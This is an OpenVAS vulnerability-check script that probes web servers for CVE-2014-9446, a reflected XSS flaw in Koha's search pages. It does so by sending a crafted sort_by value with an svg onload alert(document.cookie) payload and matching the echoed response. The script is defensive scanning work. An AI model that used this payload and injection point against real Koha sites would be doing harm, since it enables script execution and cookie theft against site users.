###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_koha_staff_client_mult_xss.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Koha Multiple XSS Vulnerabilities
#
# Authors:
# Deepednra Bapna <bdeepednra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805355");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2014-9446");
  script_bugtraq_id(71803);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-03-27 19:14:22 +0530 (Fri, 27 Mar 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Koha Multiple XSS Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Koha
  and is prone to multiple xss vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple errors exist as input passed via

  - The sort_by parameter to the opac parameter in 'opac-search.pl'

  - The sort_by parameter to the intranet parameter in 'catalogue/search.pl'
    not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"Koha before 3.16.6 and 3.18.x before 3.18.2");

  script_tag(name:"solution", value:"Upgrade to version 3.16.6 or 3.18.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71803/info");
  script_xref(name:"URL", value:"http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=13425");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_xref(name:"URL", value:"http://www.koha.org");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

foreach dir (make_list_unique("/", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";
  rcvRes = http_get_cache(item:string(dir, "/"),  port:http_port);

  if("Log in to Koha" >< rcvRes || rcvRes && rcvRes =~ "Powered by.*Koha")
  {
    url = dir + '/cgi-bin/koha/opac-search.pl?idx=kw&q=12&sort_by='
              + '"><svg/onload=alert(document.cookie)>&addto=';

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"alert\(document\.cookie\)", extra_check:">Log in"))
    {
      report = report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);
